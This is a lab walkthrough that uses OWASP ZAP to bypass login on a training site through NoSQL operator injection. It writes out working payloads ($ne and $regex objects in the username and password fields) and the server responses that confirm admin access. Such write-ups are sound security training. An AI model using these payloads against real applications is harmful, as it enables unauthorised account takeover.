# Lab: Exploiting NoSQL operator injection to bypass authentication [OWASP Zed Attack Proxy]

In ZAP's browser log in as `wiener:peter`, under __History__ tab, find `POST /login` request with body:

```json
{"username":"wiener","password":"peter"}
```

Right-click the request and select "Open in Requester Tab". Change the value of `username` parameter from `"wiener"` to `{"$ne":""}` and click send. Response:

```
HTTP/1.1 302 Found
Location: /my-account?id=wiener
```

Now change the value of the `password` parameter from `"peter"` to `{"$ne":""}` and send the request:

```html
<h4>Internal Server Error</h4>
<p class=is-warning>Query returned unexpected number of records</p>
```

This suggests that our query matched too many users. Now change the value of `username` parameter to `{"$regex":"admin.*"}` and send the request:

```
HTTP/1.1 302 Found
Location: /my-account?id=admin6fn8crcu
```

To open this in browser and solve the lab, there is no neat little trick in ZAP like Burp's __Request in Browser__ functionality, but one way to do it is with Breakpoints:

> NOTE: Unebelievably this ended up being the hardest part of the lab.

- Go to the homepage of the site, make sure you're logged out. Then navigate to `/my-account` page
- Go to ZAP and turn on the __Break__ (__Tools__ > __Toggle Break on All Requests__).
- Log in as `wiener:peter`
- In ZAP a __Break__ tab will appear with your intercepted request. Replace the entire request body with `{"username":{"$regex":"admin.*"},"password":{"$ne":""}}`.
- Go to __Tools__ and choose __Submit and Continue to Next Breakpoint__

Now you're logged in and the lab is solved. 
